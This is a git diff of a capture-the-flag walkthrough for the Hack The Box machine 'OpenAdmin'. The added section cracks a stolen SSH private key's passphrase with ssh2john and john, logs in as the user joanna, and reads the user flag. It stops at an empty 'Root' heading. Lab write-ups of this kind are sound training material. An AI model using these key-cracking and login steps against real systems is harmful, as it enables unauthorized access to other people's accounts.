@@ -361,7 +361,9 @@ jimmy@openadmin:~$ cat /var/www/internal/index.php
             $msg = '';
 
             if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
-              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
+              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == 
+              '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758e
+               ebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                   $_SESSION['username'] = 'jimmy';
                   header("Location: /main.php");
               } else {
@@ -463,37 +465,93 @@ And BINGO, we have `joanne`'s RSA Private Key!
 
 ## Joanna
 
-**Proof Screenshot:**
+Let's try and ssh into `joanna`'s account via the RSA key.
 
-**Completed Buffer Overflow Code:**
+```bash
+root@kali:~# ssh joanna@10.10.10.171 -i ~/HTB/machines/OpenAdmin/key
+Enter passphrase for key '/root/HTB/machines/OpenAdmin/key':
+Enter passphrase for key '/root/HTB/machines/OpenAdmin/key':
+Enter passphrase for key '/root/HTB/machines/OpenAdmin/key':
+joanna@10.10.10.171's password:
+Permission denied, please try again.
+joanna@10.10.10.171's password:
+fPermission denied, please try again.
+joanna@10.10.10.171's password:
+joanna@10.10.10.171: Permission denied (publickey,password).
+root@kali:~#
+```
 
-Please see Appendix 1 for the complete Windows Buffer Overflow code.
+Looks like we do not have the password to the RSA key. Let's try to crack the RSA key to get the password. First we need to unzip our wordlist. On Kali, unzip the rockyou.txt.gz file with the following commands:
 
-## Maintaining Access
+```bash
+root@kali:~# sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+root@kali:~# wc -l /usr/share/wordlists/rockyou.txt
+14344392 /usr/share/wordlists/rockyou.txt
+```
 
-Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable.
-The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again.
-Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit.
+Now we need to get the hash out of the RSA Private Key, to do this following the commands below.
 
-## House Cleaning
+```bash
+root@kali:~# /usr/share/john/ssh2john.py ~/HTB/machines/OpenAdmin/key > ~/HTB/machines/OpenAdmin/rsa.hash
+root@kali:~#
+```
 
-The house cleaning portions of the assessment ensures that remnants of the penetration test are removed.
-Often fragments of tools or user accounts are left on an organization's computer which can cause security issues down the road.
-Ensuring that we are meticulous and no remnants of our penetration test are left over is important.
+Now that we have the RSA hash let's try to crack the hash via `john` and the `rockyou` password list.
 
-After collecting trophies from the exam network was completed, Alec removed all user accounts and passwords as well as the Meterpreter services installed on the system.
-Offensive Security should not have to remove any user accounts or services from the system.
+```bash
+root@kali:~# /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt ~/HTB/machines/OpenAdmin/rsa.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+bloodninjas      (/root/HTB/machines/OpenAdmin/key)
+1g 0:00:00:16 DONE (2020-01-22 19:26) 0.06188g/s 887481p/s 887481c/s 887481C/s *7¡Vamos!
+Session completed
+root@kali:~#
+```
+
+And voila! We have the password to `joanna` `bloodninjas`. Let's ssh into `joanna`'s account with the password of `bloodninjas`:
+
+```bash
+root@kali:~# ssh joanna@10.10.10.171 -i ~/HTB/machines/OpenAdmin/key
+Enter passphrase for key '/root/HTB/machines/OpenAdmin/key':
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Jan 22 18:34:42 UTC 2020
+
+  System load:  0.0               Processes:             108
+  Usage of /:   49.0% of 7.81GB   Users logged in:       0
+  Memory usage: 27%               IP address for ens160: 10.10.10.171
+  Swap usage:   0%
 
 
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+41 packages can be updated.
+12 updates are security updates.
+Last login: Wed Jan 22 18:29:19 2020 from 10.10.14.42
+joanna@openadmin:~$
+```
+
+Let's print the output of `user.txt`:
+
+```bash
+joanna@openadmin:~$ cat user.txt
+c9b2cf07d40807e62af62660f0c81b5f
+joanna@openadmin:~$
+```
+
+Awesome, now we just need the `root.txt` flag
+
+## Root
 
 # Additional Items
-
-## Appendix - Proof and Local Contents:
-
-IP (Hostname) | Local.txt Contents | Proof.txt Contents
---------------|--------------------|-------------------
-192.168.x.x   | hash_here          | hash_here
-192.168.x.x   | hash_here          | hash_here
-192.168.x.x   | hash_here          | hash_here
-192.168.x.x   | hash_here          | hash_here
-192.168.x.x   | hash_here          | hash_here
